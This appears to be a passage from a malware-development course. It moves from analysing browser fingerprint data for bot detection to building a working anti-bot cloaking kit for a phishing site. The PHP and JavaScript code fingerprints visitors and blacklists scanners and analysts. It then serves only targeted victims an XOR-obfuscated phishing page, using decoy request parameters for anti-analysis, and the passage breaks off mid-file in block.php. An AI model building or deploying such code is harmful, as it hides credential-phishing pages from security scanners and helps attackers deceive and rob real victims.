The `navigator.connection.rtt` property returns the estimated effective round-trip time of the current connection, rounded to the nearest multiple of 25 milliseconds. If this value is 0, then the client is likely a bot due to the unrealistic nature of having no measurable latency in a typical network environment, as legitimate user connections will almost always have a non-zero round-trip time.

The command below prints the user agent and `navgiator.connection.rtt` property:

```
jq '.[] | {"user-agent": .http_headers."USER-AGENT", connection: .navigator.connection}' clients.json

```
Notice the number of clients connecting with a speed of `0`, and observe how most of them have the user-agent set to `Headless Chrome`.

### Timezone
If we know where our target's approximate location is (i.e. Country), we can check the timezone via the Date API and see if it's inline with the user's geographical location. For example, a user in New York is unlikely to be using Pacific Standard Time which can therefore be used as a detection strategy.

The command below prints the `dateString` property:

```
jq '.[] | {dateString}' clients.json

```
Notice the variety of time zones in the output.

```
{
  "dateString": "Mon Jan 06 2025 22:11:53 GMT+0000 (GMT)"
}
{
  "dateString": "Mon Jan 06 2025 22:12:04 GMT+0000 (Coordinated Universal Time)"
}
{
  "dateString": "Mon Jan 06 2025 14:16:39 GMT-0800 (Pacific Standard Time)"
}
{
  "dateString": "Tue Jan 07 2025 07:34:21 GMT+0900 (한국 표준시)"
}
{
  "dateString": "Tue Jan 07 2025 00:00:45 GMT+0100 (Central European Standard Time)"
}
{
  "dateString": "Mon Jan 06 2025 16:25:14 GMT-0800 (Pacific Standard Time)"
}
{
  "dateString": "Mon Jan 06 2025 20:47:42 GMT-0500 (Eastern Standard Time)"
}
{
  "dateString": "Mon Jan 06 2025 16:00:01 GMT-0800 (Pacific Standard Time)"
}
{
  "dateString": "Mon Jan 06 2025 17:52:57 GMT-0800 (Pacific Standard Time)"
}
{
  "dateString": "Mon Jan 06 2025 17:52:58 GMT-0800 (Pacific Standard Time)"
}
{
  "dateString": "Mon Jan 06 2025 17:52:57 GMT-0800 (Pacific Standard Time)"
}
{
  "dateString": "Mon Jan 06 2025 21:55:11 GMT-0500 (Eastern Standard Time)"
}

```

### Operating System
As previously mentioned, the `navigator.userAgentData` has the `platform` property which can be used to block certain OSes. Furthermore, the `navigator.platform` property provides the OS details which can be also used for the same purpose.

```
jq '.[] | {platform: .navigator.platform}' clients.json

```

```
{
  "platform": "Linux armv8l"
}
{
  "platform": "Linux x86_64"
}
{
  "platform": "Win32"
}
{
  "platform": "Win32"
}
{
  "platform": "Linux armv8l"
}
{
  "platform": "Linux armv8l"
}
{
  "platform": "Linux armv8l"
}
{
  "platform": "Linux x86_64"
}
{
  "platform": "Win32"
}

```

### Screen Interface
The `screen` interface provides information about the client's physical display, including dimensions, color depth, and orientation. It distinguishes between total screen size (`width` and `height`) and usable space (`availWidth` and `availHeight`), accounting for UI elements like taskbars. Specifically, it offers us the room for anamoly detection via the following:

- The `availHeight` property will usually be slightly smaller than the `height` value. If the `width`, `height`, `availWidth` and `availHeight` are the same, it's usually an indicator of automated behavior.

- The `orientation` for non-mobile devices should usually be `landscape-primary`. Note that there are some legitimate cases where the orientation isn't `landscape-primary` so that should be taken into consideration. However, in our logs we saw numerous clients with `orientation` set to `portrait-primary` which is often associate with automated behavior.

The command below extracts the HTTP user agent and the `screen` data.

```
jq '.[] | {"user-agent": .http_headers."USER-AGENT", screen}' clients.json

```

### Window Interface
The `window` interface provides extensive information about the browser's current window, such as its dimensions and positions. The following methods can be used as a bot detection mechanism:

- If the inner screen dimensions (`innerWidth` and `innerHeight`) are larger than the outer dimensions (`outerWidth` and `outerHeight`) without a change in the `devicePixelRatio`.

- If the user agent is displaying a mobile user agent and the `window` interface is missing the `ontouchstart` property.

- If the `window.history.length`, which is the number of URLs in the history list of the current browser window, exceeds a certain threshold. Depending on how the phishing URL is being delivered, the value will differ. For example, if the URL was delivered via email, then clicking the URL opens a new tab in a browser which would have `window.history.length` being `1`.

- If the `window.screenX` and `window.screenY` exceed a certain threshold. The `window.screenX` value indicates the horizontal distance, in pixels, of the left border of the user's browser viewport to the left side of the screen. Whereas the `window.screenY` value indicates the vertical distance, in pixels, of the top border of the user's browser viewport to the top edge of the screen.

If a client is browsing normally with their browser filling up their screen, these values would be `0` in most cases. One exception is on macOS, where `screenY` would typically be larger than `0` due to the presence of the macOS menu bar at the top of the screen. An example of the browser filling up the screen is shown below:

The offsets for the image above are `0` because the browser is perfectly aligned with the top and left edges of the physical screen, leaving no displacement.

```
"screenX": 0,
"screenY": 0,

```
On the other hand, if the browser window is not maximized, is manually resized, or is positioned away from the screen edges, `screenX` and `screenY` will reflect the offset of the browser's top-left corner relative to the physical screen's edges. These offsets are usually found in automated clients.

The offsets for the image above are greater than `0` in this case:

```
"screenX": 300,
"screenY": 51,

```
An interesting observation is automated clients may have an offset for both `screenX` and `screenY`. For example, the image below shows the offsets for several bot clients.

With that said, blocking clients with both `screenX` and `screenY` offsets can be an aggressive blocking method that may block legitimate clients as well.

### HardwareConcurrency Property
A lot of automated clients are using servers with significantly higher or lower numbers of logical CPU cores compared to typical consumer devices. For example, automated bots might run on servers with 1-2 cores or more than 32 cores, while many consumer devices usually have 4 to 32 cores. The `navigator.hardwareConcurrency` property can reveal this discrepancy, helping to identify potential automation if the value falls outside the expected range for the claimed user-agent or device type.

The command below prints the `navigator.hardwareConcurrency`. Notice in the output some extremely unrealistic values.

```
jq '.[] | {"hardwareConcurrency": .navigator.hardwareConcurrency}' clients.json

```

```
{
  "hardwareConcurrency": 64 // Bot
}
{
  "hardwareConcurrency": 16
}
{
  "hardwareConcurrency": 40 // Bot
}
{
  "hardwareConcurrency": 8
}
{
  "hardwareConcurrency": 245 // Bot
}
{
  "hardwareConcurrency": 119 // Bot
}
{
  "hardwareConcurrency": 117 // Bot
}
{
  "hardwareConcurrency": 247 // Bot
}

```

### MaxTouchPoints Property
The `navigator.maxTouchPoints` property provides the number of simultaneous touch points supported by the device. It is commonly used to differentiate between touch-enabled devices, like smartphones and tablets (which typically have a value greater than 0), and non-touch devices, such as traditional desktops and laptops (which usually have a value of 0). Discrepancies between this value and the claimed device type in the user-agent string can indicate potential automation or spoofing. The command below prints the user agent and `navigator.maxTouchPoints` property:

```
jq '.[] | {"user-agent": .http_headers."USER-AGENT", maxTouchPoints: .navigator.maxTouchPoints}' clients.json

```
The output below shows a user agent that claims to be a desktop yet has `maxTouchPoints` set to a value of `10`.

```
{
  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
  "maxTouchPoints": 10
}

```

### Prototype Tampering
Prototype tampering is the modification or replacement of native JavaScript object prototypes, often performed by bots or automated scripts to mimic legitimate browser behavior. This can include altering objects like `PluginArray`, `Plugin`, `MimeTypeArray`, or `MimeType` to fake the presence of plugins, modify browser capabilities, or bypass detection mechanisms. Identifying prototype tampering is an effective way to detect bots, as legitimate browsers rarely deviate from the expected prototype chain, while tampered environments frequently introduce mismatches or inconsistencies.

The command below prints the `prototypeTampering` object.

```
jq '.[] | {prototypeTampering}' clients.json

```

## Vendor Property
The `navigator.vendor` property is always either "Google Inc.", "Apple Computer, Inc.", or in Firefox an empty string. A mismatch between the user-agent and vendor is usually an indicator of automated activity. Use the command below to print the user agent and vendor property.

```
jq '.[] | {"user-agent": .http_headers."USER-AGENT", vendor: .navigator.vendor}' clients.json

```
An example of an inconsistent result is when the user agent is showing that it's an Apple iPhone, yet the vendor is "Google Inc.".

```
{
  "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/123.0.6312.52 Mobile/15E148 Safari/604.1",
  "vendor": "Google Inc."
}

```
Whereas when the website is being legitimately accessed through an iPhone should show "Apple Computer Inc.", regardless of the browser being used.

```
{
  "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.6778.154 Mobile/15E148 Safari/604.1",
  "vendor": "Apple Computer, Inc."
}

```
On macOS laptops, the `vendor` property varies by browser. The first log below shows its value in Google Chrome, while the second log shows its value in Safari.

```
{
  "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "vendor": "Google Inc."
}
{
  "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
  "vendor": "Apple Computer, Inc."
}

```

## Conclusion
In this module, we analyzed data collected by the JavaScript library and developed logical detection techniques. While additional techniques could be explored, including them might complicate the process of translating these detection methods into code and could potentially increase false positives.

Security scanners typically lack the sophistication of advanced automation tools used for tasks like web scraping. As a result, the techniques outlined here are likely sufficient to block the vast majority of scanners effectively.

## Objectives
Scan your website using several online URL scanners

Find additional bot patterns in the log file


---

# Módulo 75 — Construindo Biblioteca Anti-Bot

Módulo 75 — Building An Anti-Bot Library

- # Módulo 75 — Construindo Biblioteca Anti-Bot

# Disclaimer

## Introduction
Using the telemetry collected from the previous module, this module focuses on developing client-side and server-side anti-bot scripts that effectively block bots while maintaining a low false positive rate.Additionally, this module uses several concepts explained in previous modules, therefore it's recommended to complete any previous modules prior to advancing further in this module.
## Implementation Files
The implementation of this module requires multiple PHP and JavaScript scripts. The primary files are:
`index.php` - The core file that conducts client-side and server-side checks and either serves the phishing page upon successful validation or an error page upon failure. Additionally, this file is responsible for obfuscating the frontend code for anti-analysis.

- `log.php` - Logs the status of clients, indicating whether they passed or failed the checks, along with the specific reason for failure.

- `block.php` - Handles the reception of encrypted user IP addresses, decrypts them, and adds them to a blacklist.

- `retrievePage.php` - Validates the query parameter, encrypts the phishing page, and returns the encrypted phishing content and encryption key.

- `decrypt.js` - Responsible for de-obfuscating the frontend code and encrypted phishing page via the `xorEncryptDecrypt` function.

## Bot Checks
Every client accessing the phishing website undergoes a series of client-side and server-side checks designed to maximize bot detection while minimizing false positives. These checks aim to strike an optimal balance between security and usability. Feel free to add new rules or remove some rules listed below.

A client will be blocked if any of the following conditions are met:

- The IP address belongs to a known data center.

- The IP address is associated with a known crawler.

- The user agent matches a known crawler or bot user agent.

- The client is using an outdated browser version.

- `navigator.webdriver` is enabled, indicating automation.

- The client has no languages set (i.e., `navigator.languages` or `navigator.language` is empty).

- The client's `navigator.languages` does not include `en`, `en-US`, or `en-CA`, assuming the target audience is English-speaking.

- The client's `navigator.connection.rtt` is `0`, which may indicate a headless browser.

- The HTTP user agent header and `navigator.userAgent` do not match, indicating user agent spoofing.

- The `navigator.platform` or `navigator.userAgentData` identifies the device as Linux.

- The `navigator.hardwareConcurrency` value is greater than 32.

- The client is not a mobile device or Firefox, and `navigator.plugins.length` is `0`.

- `navigator.cookieEnabled` is set to `false`, indicating cookies are disabled.

- The client's timezone is neither "Eastern Standard Time" nor "Eastern Daylight Time," assuming the target audience resides in this timezone.

- `screen.availHeight` and `screen.height` are identical, and `screen.availWidth` and `screen.width` are identical.

- The client is not a mobile device, and the screen orientation is neither `landscape-primary` nor `landscape-secondary`. This can be further restricted to allow only `landscape-primary`.

- `window.history.length` is greater than 20.

- The client is not a mobile device, and `window.outerWidth` is larger than `window.innerWidth` or `window.outerHeight` is larger than `window.innerHeight`.

## Index.php Implementation
As mentioned earlier, `index.php` serves as the core of our implementation. The first step is to retrieve the user's IP address. To account for scenarios where Cloudflare or a reverse proxy is in use, the script checks for the `CF-Connecting-IP` header (Cloudflare) or the `X-Forwarded-For` header (reverse proxy). If neither of these headers exists, it defaults to fetching the direct connection IP address.

Next we define the `encryptIpAddress` function, which will perform AES encryption on the IP address. The encrypted IP address will be utilized in the scenario where we want to blacklist the user's IP, this prevents the user from being able to tamper with the IP address value. The `encryptIpAddress` function takes two parameters:

- `$ipAddress` - The IP address to be encrypted.

- `$key` - The AES encryption key used for encryption.

Lastly, an encryption key is defined, `$encryptionKey`, and the `encryptIpAddress` function is used to encrypt the IP address, and then URL encode the encrypted value to ensure safe transmission and prevent any encoding issues.

```
<?php
// Uncomment the lines below to enable error reporting for debugging purposes
// This will display all errors, warnings, and notices in the output
// error_reporting(E_ALL);
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);

// Get IP Address
if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) { // If Cloudflare is in use
    $ipAddress = $_SERVER['HTTP_CF_CONNECTING_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { // If there is a proxy use the first IP in the X-Forwarded-For header
    $ipAddress = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; 
} else {
    $ipAddress = $_SERVER['REMOTE_ADDR'];
}

function encryptIpAddress($ipAddress, $key) {
    $method = 'AES-256-CBC';
    $ivLength = openssl_cipher_iv_length($method);
    $iv = openssl_random_pseudo_bytes($ivLength);

    $encrypted = openssl_encrypt($ipAddress, $method, $key, 0, $iv);
    $result = base64_encode($iv . $encrypted);
    return $result;
}

// Must be the same in the block.php file
$encryptionKey = 'MaldevSecretKey321';
$encryptedIp = encryptIpAddress($ipAddress, $encryptionKey);
$encryptedIp = rawurlencode(encryptIpAddress($ipAddress, $encryptionKey)); // URL Encode

```

### IP Blacklisting
Since we have the user's IP address, we will check our blacklist file to determine if it is blacklisted. If the user's IP address is found in the blacklist, they will be shown an error page instead of the phishing page. The `isIpBlacklisted` function has two parameters:

- `$ipAddress` - The IP address to be checked.

- `$ipBlacklistFile` - The path to the blacklist file.

Ensure that the `ip_blacklist.txt` file is created and proper permissions are set using the commands below:

```
# Create file
touch /var/www/ip_blacklist.txt

# Change owner
chown www-data:www-data ip_blacklist.txt

```

```
$ipBlacklistFile = '/var/www/ip_blacklist.txt';

// Function to check if an IP is blacklisted
function isIpBlacklisted($ipAddress, $ipBlacklistFile) {
    if (file_exists($ipBlacklistFile)) {
        $blacklistedIps = file($ipBlacklistFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (in_array($ipAddress, $blacklistedIps)) {
            return true;
        }
    }
    return false;
}

// Check if the IP is already blacklisted
if (isIpBlacklisted($ipAddress, $ipBlacklistFile)) {
    echo "<!DOCTYPE html>
          <html lang='en'>
          <head>
              <meta charset='UTF-8'>
              <title>Error</title>
              <style>
                  body { 
                      font-family: Arial, sans-serif; 
                      display: flex; 
                      justify-content: center; 
                      align-items: center; 
                      height: 100vh; 
                      margin: 0; 
                      background-color: #f4f4f4; 
                      color: #333; 
                      text-align: center; 
                  }
              </style>
          </head>
          <body>
              <p>Error loading the page. Please try again later.</p>
          </body>
          </html>";
    exit;
}

```

### Cookie Validation
When a user's IP address is blacklisted, a cookie named `user_blocked` is set to identify the user even if they change their IP address, which they may attempt while analyzing the website. The code below checks if the `user_blocked` cookie is set. If it is, the user will be shown an error page instead of the phishing page.

```
if (isset($_COOKIE['user_blocked'])) {
    echo "<!DOCTYPE html>
    <html lang='en'>
    <head>
        <meta charset='UTF-8'>
        <title>Error</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                height: 100vh; 
                margin: 0; 
                background-color: #f4f4f4; 
                color: #333; 
                text-align: center; 
            }
        </style>
    </head>
    <body>
        <p>Error loading the page. Please try again later.</p>
    </body>
    </html>";
    exit;
}

```

### IP Assessment
Next, we query an external API, `api.incolumitas.com`, to assess whether the user's IP address is associated with a crawler or a data center. If so, the `$isCrawlerIp` and `$isDataCenterIp` are set to `true`, respectively.

```
$apiUrl = "https://api.incolumitas.com/?q={$ipAddress}";
$response = file_get_contents($apiUrl);
$locationData = json_decode($response, true);

// Value must be normalized prior to using in JS
$isCrawlerIp = json_encode(!empty($locationData['is_crawler']));
$isDataCenterIp = json_encode(!empty($locationData['is_datacenter']));

```

### Browser Version
The user's browser version is assessed by extracting the version number from the HTTP `User-Agent` header. If the detected browser is Chrome, Firefox, Edge, or Safari and meets the specified minimum version requirement, the `$browserNew` variable is set to `true`. Otherwise, it remains `false`.

```
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$GOOGLE_CHROME_MIN_VERSION = 125;
$FIREFOX_MIN_VERSION = 125;
$EDGE_MIN_VERSION = 125;
$SAFARI_MIN_VERSION = 16;

$browserNew = json_encode(false);
if (preg_match('/Chrome\/(\d+)/', $userAgent, $matches) && (int)$matches[1] >= $GOOGLE_CHROME_MIN_VERSION) {
    $browserNew = json_encode(true);
} elseif (preg_match('/Firefox\/(\d+)/', $userAgent, $matches) && (int)$matches[1] >= $FIREFOX_MIN_VERSION) {
    $browserNew = json_encode(true);
} elseif (preg_match('/Edg\/(\d+)/', $userAgent, $matches) && (int)$matches[1] >= $EDGE_MIN_VERSION) {
    $browserNew = json_encode(true);
} elseif (preg_match('/Safari\/(\d+)/', $userAgent, $matches) && (int)$matches[1] >= $SAFARI_MIN_VERSION) {
    $browserNew = json_encode(true);
}

```

### Crawler User-Agent
We'll also inspect the user's `User-Agent` to determine if it matches any known crawler user agents. Make sure to download the `crawler-user-agents.json` file before running the code.

```
# Download the file
curl -L https://raw.githubusercontent.com/monperrus/crawler-user-agents/master/crawler-user-agents.json -o crawler-user-agents.json

# Move the file outside of the web root
mv crawler-user-agents.json /var/www

```

```
$crawlerUserAgent = json_encode(false);
$jsonFile = '/var/www/crawler-user-agents.json';
$botList = json_decode(file_get_contents($jsonFile), true);

function isBot($userAgent, $botList) {
    foreach ($botList as $bot) {
        if (preg_match('/' . $bot['pattern'] . '/i', $userAgent)) {
            return true;
        }
    }
    return false;
}

if (isBot($userAgent, $botList)) {
    $crawlerUserAgent = json_encode(true);
}

```

### Client Bot Checks
Using our PHP script, we will generate a heredoc containing the necessary JavaScript. Based on the bot detection checks we previously explained, multiple variables will be initialized to gather relevant client information. Additionally, we will pass several variables from the PHP script to the frontend script.

The `checkClient` function analyzes the gathered client information to determine if the user is a bot. If the user fails any of the checks, the functions `logClientData` and `blockClient` are called.

Conversely, if the user passes all checks, `logClientData` is invoked and `retrievePage` is continuously executed within a `while(true)` loop using various randomized parameters. These functions will be explained in detail in upcoming sections.

```
$htmlContent = <<<SCRIPT
<script>
const ipAddress = "{$ipAddress}";
const encIp = "{$encryptedIp}";
const httpUserAgent = "{$userAgent}";
const isCrawlerIp = JSON.parse({$isCrawlerIp});
const browserNew = JSON.parse({$browserNew});
const isDataCenterIp = JSON.parse({$isDataCenterIp});
const isCrawlerUserAgent = JSON.parse({$crawlerUserAgent});
const jsUserAgent = navigator.userAgent;
const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(jsUserAgent) && navigator.maxTouchPoints > 0;
const languages = navigator.languages || [];
const language = navigator.language || '';
const rtt = navigator.connection ? navigator.connection.rtt : null;
const platform = navigator.userAgentData?.platform || navigator.platform || null;
const hardwareConcurrency = navigator.hardwareConcurrency;
const pluginsLength = navigator.plugins.length;
const cookiesEnabled = navigator.cookieEnabled;
const timezone = new Date().toString().match(/\(([^)]+)\)/)[1];
const isWebdriver = navigator.webdriver;
const screenWidth = screen.width;
const screenHeight = screen.height;
const availWidth = screen.availWidth;
const availHeight = screen.availHeight;
const orientation = screen.orientation ? screen.orientation.type : 'unknown';
const innerWidth = window.innerWidth;
const innerHeight = window.innerHeight;
const outerWidth = window.outerWidth;
const outerHeight = window.outerHeight;
const historyLength = window.history.length;
const devicePixelRatio = window.devicePixelRatio;

function checkClient() {
    if (isDataCenterIp) {
        logClientData("Data center IP address detected", isDataCenterIp);
        blockClient();
    } else if (isCrawlerIp) {
        logClientData("Crawler IP address detected", isCrawlerIp);
        blockClient();
    } else if (isCrawlerUserAgent){
        logClientData("Known crawler user agent detected", httpUserAgent);
        blockClient();
    } else if (!browserNew) {
        logClientData("Old browser version detected", browserNew);
        blockClient();
    } else if (isWebdriver) {
        logClientData("Web driver detected", isWebdriver);
        blockClient();
    } else if (!languages.length || !language) {
        logClientData("No language detected", languages);
        blockClient();
    } else if (!(languages.includes("en-US") || languages.includes("en") || languages.includes("en-CA"))) {
        logClientData("Language is not whitelisted", languages);
        blockClient();
    } else if (language !== languages[0]) {
        logClientData("Primary language mismatch", language);
        blockClient();
    } else if (rtt === 0) {
        logClientData("Zero round-trip time detected", rtt);
        blockClient();
    } else if (httpUserAgent !== jsUserAgent) {
        logClientData("User agent string mismatch", { httpUserAgent, jsUserAgent });
        blockClient();
    } else if (/linux/i.test(platform)) {
        logClientData("Linux platform detected", platform);
        blockClient();
    } else if (hardwareConcurrency > 32) {
        logClientData("Unusual hardware concurrency", hardwareConcurrency);
        blockClient();
    } else if (!('oscpu' in navigator) && !isMobile && pluginsLength === 0) {
        logClientData("No plugins detected", pluginsLength);
        blockClient();
    } else if (!cookiesEnabled) {
        logClientData("Cookies are disabled", cookiesEnabled);
        blockClient();
    } else if (!(timezone.includes("Eastern Standard Time") || timezone.includes("Eastern Daylight Time"))) {
        logClientData("Timezone is not whitelisted", timezone);
        blockClient();
    } else if (screenWidth === availWidth && screenHeight === availHeight) {
        logClientData("Fullscreen mode detected", { screenWidth, screenHeight, availWidth, availHeight });
        blockClient();
    } else if (!isMobile && !/^landscape-(primary|secondary)$/.test(orientation)) {
        logClientData("Invalid orientation", orientation);
        blockClient();
    } else if (historyLength > 20) {
        logClientData("Unusually long history length", historyLength);
        blockClient();
    } else if (!isMobile && (innerWidth > outerWidth * devicePixelRatio || innerHeight > outerHeight * devicePixelRatio) && devicePixelRatio >= 1) {
        logClientData("Viewport scaling anomaly detected", { innerWidth, outerWidth, innerHeight, outerHeight, devicePixelRatio });
        blockClient();
    } else {
        logClientData("No detections", "None", "Pass");
        (async function() {
            while (true) {
                const timestamp = Date.now();
                const clientId = btoa("client-" + Math.random().toString(36).substring(7));
                const randomNum = Math.floor(Math.random() * 5) + 1;
                const userAgentLength = navigator.userAgent.length + randomNum + Math.floor(Math.random() * 100);

                const success = await retrievePage(timestamp, clientId, randomNum, userAgentLength);
                if (success) break;
            }
        })();
    }
}

```

### Debug Function
For debugging and troubleshooting purposes, the `printDebugValues` function can be invoked to display all collected values, allowing for a detailed analysis of client data and potential issues.

```
function printDebugValues() {
    console.log("IP Address:", ipAddress);
    console.log("Encrypted IP Address:", encIp);
    console.log("Data Center IP Address:", isDataCenterIp);
    console.log("Crawler IP Address:", isCrawlerIp);
    console.log("Crawler User Agent:", isCrawlerUserAgent);
    console.log("New Browser:", browserNew);
    console.log("Is Mobile:", isMobile);
    console.log("HTTP User Agent:", httpUserAgent);
    console.log("JS User Agent String:", jsUserAgent);
    console.log("Languages:", languages);
    console.log("Primary Language:", language);
    console.log("RTT:", rtt);
    console.log("Platform:", platform);
    console.log("Hardware Concurrency:", hardwareConcurrency);
    console.log("Plugins Length:", pluginsLength);
    console.log("Cookies Enabled:", cookiesEnabled);
    console.log("Timezone:", timezone);
    console.log("Webdriver enabled:", isWebdriver);
    console.log("Screen Width:", screenWidth);
    console.log("Screen Height:", screenHeight);
    console.log("Available Width:", availWidth);
    console.log("Available Height:", availHeight);
    console.log("Orientation:", orientation);
    console.log("Inner Width:", innerWidth);
    console.log("Inner Height:", innerHeight);
    console.log("Outer Width:", outerWidth);
    console.log("Outer Height:", outerHeight);
    console.log("History Length:", historyLength);
    console.log("Device Pixel Ratio:", devicePixelRatio);
}

```

### logClientData Function
The `logClientData` function is responsible for recording client-related information, logging failed bot detection checks, and storing relevant details such as the failure reason, the value that resulted in the failure, client status, and IP address in the `log.php` endpoint for further analysis and monitoring.

The `logClientData` function has four parameters:

- `failReason` - The bot checks that the user failed.

- `failValue` - The value that causes the failure.

- `clientStatus` - One of two values `Fail` or `Pass`.

- `clientIp` - The user's IP address.

```
function logClientData(failReason, failValue, clientStatus = "Fail", clientIp = ipAddress) {
    fetch("log.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            ip: clientIp,
            status: clientStatus,
            reason: failReason,
            failValue: failValue
        })
    });
}

```

### blockClient Function
The `blockClient` function is responsible for blocking a client identified as a bot or suspicious user. The function has one parameter which is the client's encrypted IP address and it performs three main actions.

First, it blacklists the client's IP by sending a request to `block.php` with the encrypted IP to add the client to the blacklist.

Then it sets the `user_blocked` cookie that was previously discussed with a random value. The value is irrelevant as the server-side script simply checks for the cookie's presence. And finally it replaces the entire page content with an error message.

Note: Replace `domain.com` in the code with your domain name.

```
function blockClient(encryptedIp = encIp) {
    // Blacklist IP
    var url = "https://domain.com/block.php?encIp=" + encryptedIp;
    fetch(url);

    // Set the user_blocked cookie
    const randomValue = Math.random().toString(36).substring(2, 15);
    document.cookie = "user_blocked=" + randomValue + "; max-age=31536000;";

    // Display error
    document.documentElement.innerHTML = `
        <!DOCTYPE html>
        <html lang='en'>
        <head>
        <meta charset='UTF-8'>
        <title>Error</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                height: 100vh; 
                margin: 0; 
                background-color: #f4f4f4; 
                color: #333; 
                text-align: center; 
            }
        </style>
        </head>
        <body>
        <p>Error loading the page. Please try again later.</p>
    </body>
    </html>
    `;
}

```

### retrievePage Function
The `retrievePage` function is tasked with retrieving the phishing page from the server. It issues an HTTP `GET` request to `retrievePage.php` with parameters including a timestamp, client identifier, a random number from 1 to 5, and another random number generated using the user agent length. The only important parameter is the random number from 1 to 5, the remaining parameters are in place for deceptive purposes and to make anti-analysis more tricky. This will become more apparent when we analyze the `retrievePage.php` endpoint later in the module.

If the request is successful and the server returns the encrypted page content along with a decryption key, the function decrypts the content using `xorEncryptDecrypt` and updates the webpage.

```
async function retrievePage(timestamp, clientId, randomNum, userAgentLength) {
    return fetch("retrievePage.php?time=" + timestamp + "&clientId=" + clientId + "&num=" + randomNum + "&uaLen=" + userAgentLength, { method: "GET" })
        .then(res => {
            if (res.ok) return res.json();
            throw new Error("Request failed");
        })
        .then(data => {
            if (data.html && data.key) {
                const decPage = xorEncryptDecrypt(data.html, data.key, false);
                document.body.innerHTML = decPage;
                return true;
            }
            return false;
        })
        .catch(() => {
            return false;
        });
}

```
The last part of the heredoc invokes the `checkClient` function to perform bot detection checks while the `printDebugValues()` function is commented out but can uncommented for debugging purposes.

```
// printDebugValues();
checkClient();
</script>
SCRIPT;

```

### Frontend Obfuscation
The last part of the `index.php` file defines the `xorEncryptDecrypt` function, which applies an XOR cipher to encrypt the frontend. The encrypted frontend is then Base64-encoded to avoid encoding issues and is stored within a hidden `<div>` with the ID `encrypted`, along with the encryption key in another hidden `<div>` with the ID `key`. A separate script, `decrypt.js`, is then loaded to handle decryption on the client side.

```
$key = bin2hex(random_bytes(16));
function xorEncryptDecrypt($input, $key, $encode = true) {
    $output = '';
    $keyIndex = 0;
    $keyLength = strlen($key);

    if (!$encode) {
        $input = base64_decode($input);
    }

    for ($i = 0; $i < strlen($input); $i++) {
        $charCode = ord($input[$i]);
        $keyCharCode = ord($key[$keyIndex]);
        $xorCharCode = $charCode ^ $keyCharCode;
        $output .= chr($xorCharCode);
        $keyIndex = ($keyIndex + 1) % $keyLength;
    }

    if ($encode) {
        $output = base64_encode($output);
    }

    return $output;
}

$encryptedContent = xorEncryptDecrypt($htmlContent, $key, true);

echo "<html><body>";
echo "<div id='encrypted' style='display:none;'>$encryptedContent</div>";
echo "<div id='key' style='display:none;'>$key</div>"; 
echo "<script src='decrypt.js'></script>";
echo "</body></html>";

```

## Log.php Implementation
The `log.php` file is responsible for recording client information, specifically whether they pass or fail the bot detection checks. This helps analyze the effectiveness of different detection methods, identify areas for improvement, and assist in debugging. The script receives data from the `logClientData` JavaScript function and logs the client's IP address, pass/fail status, the specific value that triggered a failure, and the timestamp.

To ensure proper logging, the log file must exist and be writable by the server. Use the following commands to create and set the appropriate permissions:

```
# Create the log file
touch /var/www/clientLogs.json

# Set ownership to the web server user
chown www-data:www-data /var/www/clientLogs.json

```

```
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents("php://input"), true);

    $logEntry = [
        "ip" => $data["ip"] ?? "unknown",
        "status" => $data["status"] ?? "unknown",
        "reason" => $data["reason"] ?? "unknown",
	    "value" => $data["failValue"] ?? "unknown",
        "timestamp" => date("c")
    ];

    $file = "/var/www/clientLogs.json";
    $logs = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
    $logs[] = $logEntry;

    file_put_contents($file, json_encode($logs, JSON_PRETTY_PRINT));
}
?>

```
NOTE: The current implementation of `log.php` could potentially allow a user to spam the log file with excessive entries due to the lack of security measures. This risk can be addressed by rate limiting IP addresses invoking `log.php`, as implemented in a previous module, or by restricting the maximum number of log entries per IP to a set number, preventing further logging once the limit is reached.

## Block.php Implementation
The `block.php` file receives the encrypted IP address, decrypts it using the same AES encryption key from `index.php`, and adds it to the IP blacklist file, `ip_blacklist.txt`, if it is not already listed.

The `decryptIpAddress` function takes two parameters:

- `$encryptedData` – The Base64-encoded and encrypted IP address.

- `$key` – The encryption key used to decrypt the data, ensuring it matches the one used during encryption in the `index.php` file.

```
<?php
function decryptIpAddress($encryptedData, $key) {
    $method = 'AES-256-CBC';
    $ivLength = openssl_cipher_iv_length($method);
    $data = base64_decode($encryptedData);
    $iv = substr($data, 0, $ivLength);
    $encrypted = substr($data, $ivLength);
    $decrypted = openssl_decrypt($encrypted, $method, $key, 0, $iv);

    return $decrypted;
}

// The same key from our index.php file
$encryptionKey = 'MaldevSecretKey321';
$encryptedIp = isset($_GET['encIp']) ? $_GET['encIp'] : '';

if (!empty($encryptedIp)) {
    $decryptedIp = decryptIpAddress($encryptedIp, $encryptionKey);

    $file = '/var/www/ip_blacklist.txt';
    $currentContents = file_get_contents($file);

    if ($currentContents !== false && strpos($currentContents, $decryptedIp) === false) {
        file_put_contents($file, $decryptedIp . "\n", FILE_APPEND);
        http_response_code(200);
    } else {
        http_response_code(400); 
